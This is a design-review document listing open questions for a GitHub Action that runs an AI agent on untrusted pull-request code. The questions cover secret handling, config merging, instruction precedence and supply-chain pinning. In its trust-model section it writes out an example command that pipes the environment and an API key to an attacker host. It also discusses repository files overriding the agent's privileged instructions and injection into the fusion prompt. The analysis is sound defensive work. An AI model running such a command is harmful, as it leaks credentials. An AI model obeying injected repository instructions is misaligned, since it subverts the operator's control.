# Open Review Questions

> Status: **Tier 1-3 quiz resolved** (13 decisions, baked into
> `design-vision.md`). The remaining questions are the undecided
> design-level items from the original 28 findings.
>
> Numbering from the original review is preserved in parentheses for
> traceability.

## Re-evaluation summary

Re-evaluated the remaining 12 items (Tier 4 + Tier 5) after the Tier 1-3
resolutions. Some merged, some reframed, one dropped.

| Original | Disposition | New label |
|---|---|---|
| A1 (#17), A2 (#15) | **Merged** — same question from two angles | A1 |
| B1 (#7), B2 (#8), B3 (#9) | **Merged** — coupled config-builder decisions | B1 |
| B4 (#18) | Kept as-is | B2 |
| C1 (#11) | **Reframed** by D4 — the action's privileged instructions belong in an agent definition, not a positional prompt | C1 |
| D1 (#2) | **Reframed** — destination options reduced by D4's "model decides" | D1 |
| D9 (#22) | Kept as-is | D2 |
| D10 (#23) | Kept as-is | D3 |
| D13 (#27) | **Refined** — workflow installs + action asserts is the contract; the question is how to pin both | D4 |
| D12 (#26) | **Dropped** from questions — implementation work, not a design decision; tracked under Implementation | (tracker) |

8 open design questions remain.

---

## Theme A — Security / trust model

### A1 (merges #17 + #15) — Trust model for agent execution

The action runs an agent with `bash: allow`, provider API keys in env, and
untrusted PR code on disk. A model that runs `env | curl https://attacker/?
d=$ANTHROPIC_API_KEY` exfiltrates secrets. The current doc states this is
"an accepted risk of running an agent on untrusted code." Is that the
right framing?

- (a) Accept the risk; document it as the design contract (current doc)
- (b) Constrain agent inputs: limit MCPs/plugins/skills to base-branch
  provenance, disable local MCP commands, restrict to trusted config sources
- (c) Network-output filter: reject outbound network calls from the agent
- (d) Isolated secret mechanism: fetch secrets per-call instead of env vars

(b), (c), (d) add complexity and bound the agent's capability. (a) is the
honest "we run an agent on untrusted code" stance. The user value tradeoff:
how much friction do we add to keep the trust model simple?

## Theme B — `opencode.json` builder

### B1 (merges #7 + #8 + #9) — Config builder architecture

Three coupled decisions:

1. **Precedence / isolation** — the merged config goes to `$RUNNER_TEMP`
   and is pointed at via `OPENCODE_CONFIG`. The local re-test (in this
   branch) suggested global config still loads alongside `OPENCODE_CONFIG`.
   If global config survives, the builder's "required settings always win"
   guarantee fails for any setting the global config happens to provide.
   Empirical verification on 1.18.4 is needed.

2. **Path rebasing** — writing the merged config to `$RUNNER_TEMP` changes
   the meaning of relative paths in the user's source config (`{file:...}`,
   plugin paths, MCP `cwd`). Either rebase all relative paths to the source
   config directory, or write the merged config next to the source.

3. **Merge algorithm** — undefined for nested objects, arrays (`plugin`),
   `null`, `$schema`, and provider collisions. A deterministic deep-merge
   rule with examples for each conflicting field type is needed.

### B2 (#18) — Built-in provider registry

The action can't auto-generate provider entries for arbitrary custom
providers (they need package, baseURL, model map, secret variable). What
is the supported built-in registry? Likely: Anthropic, OpenAI, Google
Gemini, AWS Bedrock, Google Vertex, MiniMax, Kimi/Moonshot, plus GitHub
Copilot via OpenCode. Custom providers must be fully declared in trusted
user config.

## Theme C — Privileged instructions

### C1 (#11) — Where do the action's privileged instructions live?

The D4 pivot made the system prompt the sole source of context. The
prompt is currently passed as a positional arg to `opencode run`, which
makes it a user message competing with repo `AGENTS.md` and `.claude/`
instructions. An action-owned OpenCode **agent definition** (in the merged
`opencode.json`'s `agent` field) puts the privileged instructions in a
position that repo instructions can't override.

The action's interface would gain an `agent` field (or a hidden
`.ai-review` agent definition in the merged config) and the prompt becomes
the *task* the agent gets. The agent definition carries the action's
standing instructions: output format, severity legend, behavior defaults,
explicit event-context rendering.

Is this the right path? The alternative is to accept the user-message
position and trust that the model's context window privileges the prompt
over repo instructions (mostly true, but not load-bearing).

## Theme D — Interface / runtime

### D1 (#2) — Default-branch push destination

When the action runs on a `push` to the default branch (or a
`workflow_dispatch`), there is no PR to post a comment to. The
design-vision.md Future Work section lists the options. Pick one:

- (a) Commit status (green/red on the commit)
- (b) Check run (named check with details)
- (c) Open issue (with the review as the body)
- (d) Outputs only (no posting — let downstream workflows consume)
- (e) Skip silently (no-op with success exit)

### D2 (#22) — Fusion prompt contract

The synthesis pass needs a prompt template. Unspecified:

- How individual reviews are labeled (model name, prompt name, both)
- Size limits (concatenated reviews can't be unbounded)
- Injection protection (does the model see the raw prior reviews, or a
  sanitized version?)
- Tool access (fusion is read-only by construction, or no tools at all?)
- Cost accounting (is fusion included in `cost`/`tokens` outputs?)

### D3 (#23) — Failure matrix

Enumerate failure classes and the action's behavior for each:

- Per-call timeout: how is the partial output handled?
- All reviews fail: exit code, outputs, posting
- Fusion fails: post individual results anyway? Outputs?
- Invalid config: action behavior pre-model-call
- Permission assertion fails (user config overrides `permission`): fail fast?
- Checkout assertion fails: fail fast with diagnostic?
- OpenCode version assertion fails: fail fast?
- Debug redaction misses a pattern: skip upload entirely, or upload
  unredacted with a warning?

### D4 (#27) — Supply-chain pinning

The action pins nothing by itself — the workflow installs OpenCode, the
action asserts the version. The pinning story needs:

- **Immutable action release references** — `@v1` is mutable; `@<sha>` is
  not. Sample workflows should use either immutable refs or document the
  mutable ref as a known trade-off.
- **OpenCode installer integrity** — the `curl | bash` script is not
  checksum-pinned. Need a verification step (checksum, signature, or
  pre-built binary download).
- **MCP package versions** — user configs reference `npx -y <pkg>@latest`
  which floats. Document the shape or provide a verification helper.

## Implementation tracker (not design questions)

These came out of the review but are implementation work, not design
decisions. Tracked here for implementation planning.

- **D12 (#26)** — Contract tests for verified claims. Each "verified in
  1.18.4" statement in `design-vision.md` is the action's brittle ABI. A
  pinned test fixture (CLI invocation → expected JSONL shape) per claim
  catches version drift.

---

## Proposed order of attack

1. **A1** — trust model (load-bearing; gates everything)
2. **C1** — privileged instructions (depends on whether A1 is (a) or richer)
3. **B1** — config builder (coupled decisions; needs empirical check)
4. **B2** — provider registry (bounded scope)
5. **D1, D2, D3, D4** — mechanical once A–C settled
